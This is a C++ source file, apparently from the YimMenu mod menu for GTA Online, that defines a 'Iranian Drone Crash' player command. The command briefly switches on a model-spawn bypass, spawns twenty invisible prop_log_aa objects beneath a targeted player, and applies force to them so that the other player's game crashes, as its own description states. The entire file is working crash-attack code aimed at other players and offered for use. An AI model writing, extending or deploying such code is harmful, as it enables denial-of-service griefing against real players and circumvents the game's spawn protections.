#include "game/commands/PlayerCommand.hpp"
#include "game/gta/Object.hpp"
#include "game/gta/Natives.hpp"
#include "game/pointers/Pointers.hpp"
#include "core/backend/ScriptMgr.hpp"
#include "core/frontend/Notifications.hpp"

namespace YimMenu::Features
{
	static constexpr uint32_t PROP_LOG_AA_HASH = 3305783941u;
	static constexpr int NUM_OBJECTS = 20;

	class IranianDroneCrash : public PlayerCommand
	{
		using PlayerCommand::PlayerCommand;

		virtual void OnCall(Player player) override
		{
			auto ped = player.GetPed();
			if (!ped)
				return;

			auto pos = ped.GetPosition();
			int spawned = 0;

			if (Pointers.ModelSpawnBypass)
				Pointers.ModelSpawnBypass->Apply();

			for (int i = 0; i < NUM_OBJECTS; i++)
			{
				float offsetX = (float)(i % 5) * 0.5f;
				float offsetY = (float)(i / 5) * 0.5f;

				auto obj = Object::Create(PROP_LOG_AA_HASH, {pos.x + offsetX, pos.y + offsetY, pos.z - 10.0f});
				if (obj)
				{
					ENTITY::SET_ENTITY_VISIBLE(obj.GetHandle(), FALSE, FALSE);
					ENTITY::FREEZE_ENTITY_POSITION(obj.GetHandle(), FALSE);
					ENTITY::APPLY_FORCE_TO_ENTITY(obj.GetHandle(), 1, 0.0f, 0.0f, 500.0f, 0.0f, 0.0f, 0.0f, 0, TRUE, TRUE, TRUE, FALSE, TRUE);
					spawned++;
				}
				ScriptMgr::Yield();
			}

			if (Pointers.ModelSpawnBypass)
				Pointers.ModelSpawnBypass->Restore();

			if (spawned > 0)
				Notifications::Show("Iranian Drone Crash", std::format("Sent {} crash objects to {}", spawned, player.GetName()), NotificationType::Success);
			else
				Notifications::Show("Iranian Drone Crash", std::format("Failed to crash {}", player.GetName()), NotificationType::Error);
		}
	};

	static IranianDroneCrash _IranianDroneCrash{"iraniandrone", "Iranian Drone Crash", "Spawns multiple prop_log_aa objects on the player to crash them"};
}
